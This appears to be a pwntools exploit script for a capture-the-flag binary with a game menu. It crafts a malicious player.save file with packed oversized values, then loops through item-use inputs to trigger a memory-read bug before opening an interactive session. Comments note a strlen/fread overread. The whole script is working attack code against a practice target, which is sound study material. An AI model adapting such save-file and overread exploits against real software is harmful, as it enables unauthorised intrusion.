#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("/var/challenge/level7/7")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="b *useItemMenu+628")
    else:
        r = remote("addr", 1337)

    return r

def make_save():
    MAX_SHORT = 2**15 - 1
    MAX_INT = 2**31 - 1
    val1 = ord("3") | (ord("3") << 8)  # little-endian short
    val2 = ord("t") | (ord("\x00") << 8)  # little-endian short
    items = [val1, val2, MAX_SHORT, MAX_SHORT]                  # short[4]
    username = b"F"*16                 # <= 16 bytes
    username = username.ljust(16, b"\0")  # pad with nulls
    current_scene = 8                     # int
    health = MAX_INT                          # int

    # Struct format:
    # <   = little endian
    # 4h  = 4 short (items)
    # 16s = char[16] (username)
    # 2i  = 2 int (current_scene, health)
    fmt = "<4h16s2i"
    data = struct.pack(fmt, *items, username, current_scene, health)

    with open("player.save", "wb") as f:
        f.write(data)

    print(f"Wrote {len(data)} bytes to player.save")

def make_username(r, name):
    r.sendline(b"4")
    r.sendline(name)


def start_game(r):
    r.sendline(b"1")

def load_save(r):
    r.sendline(b"2")

def main():
    # hex of 1 = 0x31
    r = conn()
    make_save()
    load_save(r)
    start_game(r)

    #Using Items
    r.sendline(b"u")
    val2 = ord(";") | (ord("l") << 8)
    for i in range(0xFFFF + 1, val2, -1):
        r.sendline(b"\x30")
        print(r.recvuntil("use?"))
    r.sendline(b"e")
    r.sendline(b"s")
    r.sendline(b"y")
    r.interactive()

    # first bug size_t len = strlen(player->userName); make sizelen 0 but keep the \n at the end followed by fread maximum for an overead
    # good luck pwning :)
    # bug found at useItemMenu+608



if __name__ == "__main__":
    main()
